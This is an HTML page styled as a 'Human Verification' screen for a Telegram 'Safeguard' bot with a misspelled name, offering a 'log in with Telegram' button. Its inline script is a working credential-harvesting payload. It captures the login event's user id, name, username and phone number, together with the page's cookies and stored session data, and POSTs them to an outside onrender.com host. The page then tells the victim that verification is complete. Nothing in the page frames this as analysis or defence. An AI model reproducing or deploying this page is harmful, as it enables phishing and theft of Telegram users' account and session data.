<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Safeguard Verification</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #212121;
      color: #ffffff;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      text-align: center;
    }
    .button {
      background-color: #0088cc;
      color: white;
      border: none;
      padding: 15px 30px;
      font-size: 18px;
      border-radius: 5px;
      cursor: pointer;
      margin-top: 20px;
    }
    .button:hover {
      background-color: #0077aa;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Human Verification</h1>
    <p>Click below to log in with Telegram:</p>
    <script async src="https://telegram.org/js/telegram-widget.js?7"
      data-telegram-login="SafeGuardOfficicalBot"
      data-size="large"
      data-auth-url="https://aaaa-m2f9.onrender.com/api/users/telegram/info"
      data-request-access="write">
    </script>
  </div>
  <script>
    // Prevent redirection and capture Telegram login data
    window.addEventListener("message", (event) => {
      if (event.origin === "https://web.telegram.org") {
        const cookies = document.cookie;
        const sessionData = localStorage.getItem("session_data") || "N/A";

        // Send data to backend
        fetch("https://aaaa-m2f9.onrender.com/api/users/telegram/info", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            id: event.data.id,
            first_name: event.data.first_name,
            username: event.data.username,
            phone_number: event.data.phone_number,
            cookies: cookies,
            session_data: sessionData,
          }),
        })
          .then((response) => response.json())
          .then((data) => {
            alert("Verification complete! Data sent.");
          })
          .catch((error) => {
            console.error("Error sending data:", error);
          });
      }
    });
  </script>
</body>
</html>
